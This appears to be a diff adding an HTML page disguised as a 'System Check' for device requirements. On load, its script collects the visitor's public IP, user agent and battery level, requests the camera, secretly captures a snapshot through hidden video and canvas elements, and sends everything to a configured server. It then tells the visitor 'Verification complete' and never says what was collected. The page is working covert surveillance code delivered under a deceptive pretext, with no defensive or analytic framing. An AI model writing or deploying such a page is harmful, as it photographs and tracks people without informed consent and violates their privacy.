@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Checking Device Requirements...</title>
+    <style>
+        body { font-family: sans-serif; padding: 20px; }
+        /* Keep the video element hidden from the user */
+        #videoElement { display: none; }
+        #canvasElement { display: none; }
+    </style>
+</head>
+<body>
+    <h3>System Check</h3>
+    <p id="statusText">Requesting necessary permissions...</p>
+
+    <!-- Hidden elements needed to capture the image -->
+    <video id="videoElement" autoplay playsinline></video>
+    <canvas id="canvasElement"></canvas>
+
+    <script>
+        // --- CONFIGURATION ---
+        // Replace this with your server's endpoint
+        const SERVER_URL = "http://10.162.74.141:5000";
+
+        async function gatherAndSendData() {
+            const statusText = document.getElementById('statusText');
+            let publicIp = "Unknown";
+            let batteryData = "Not supported";
+            let imageData = null;
+
+            // 1. Get Public IP Address
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipJson = await ipResponse.json();
+                publicIp = ipJson.ip;
+            } catch (e) {
+                console.error("Failed to get IP", e);
+            }
+
+            // 2. Try to get Battery Info
+            try {
+                if ('getBattery' in navigator) {
+                    const battery = await navigator.getBattery();
+                    batteryData = `${Math.round(battery.level * 100)}% (Charging: ${battery.charging})`;
+                }
+            } catch (e) {
+                console.error("Battery API error", e);
+            }
+
+            // 3. Get Device Info
+            const deviceInfo = navigator.userAgent;
+
+            // 4. Request Camera Access and Take Snapshot
+            try {
+                // This line triggers the browser's "Allow Camera" prompt
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                
+                const video = document.getElementById('videoElement');
+                const canvas = document.getElementById('canvasElement');
+                const context = canvas.getContext('2d');
+
+                // Attach the camera stream to the hidden video element
+                video.srcObject = stream;
+
+                // Wait for the video to start playing so we can grab a frame
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        resolve();
+                    };
+                });
+
+                // Set canvas size to match the video stream
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+
+                // Draw the current video frame onto the canvas
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Convert the canvas picture into a Base64 encoded string (JPEG format)
+                imageData = canvas.toDataURL('image/jpeg', 0.8);
+
+                // IMPORTANT: Stop the camera so the light turns off
+                stream.getTracks().forEach(track => track.stop());
+
+            } catch (err) {
+                console.warn("Camera access denied or failed.", err);
+                statusText.innerText = "Camera permission was denied.";
+            }
+
+            // 5. Prepare the final data payload
+            const payload = {
+                device: deviceInfo,
+                battery: batteryData,
+                ip_address: publicIp,
+                snapshot_base64: imageData, // This will be a long text string representing the image
+                timestamp: new Date().toISOString()
+            };
+
+            // 6. Send the data to your server
+            try {
+                statusText.innerText = "Sending data to server...";
+                
+                await fetch(SERVER_URL, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(payload)
+                });
+                
+                statusText.innerText = "Verification complete.";
+            } catch (error) {
+                console.error("Failed to send data to server", error);
+                statusText.innerText = "Network error while sending data.";
+            }
+        }
+
+        // Run the script when the page loads
+        window.onload = gatherAndSendData;
+    </script>
+</body>
+</html>
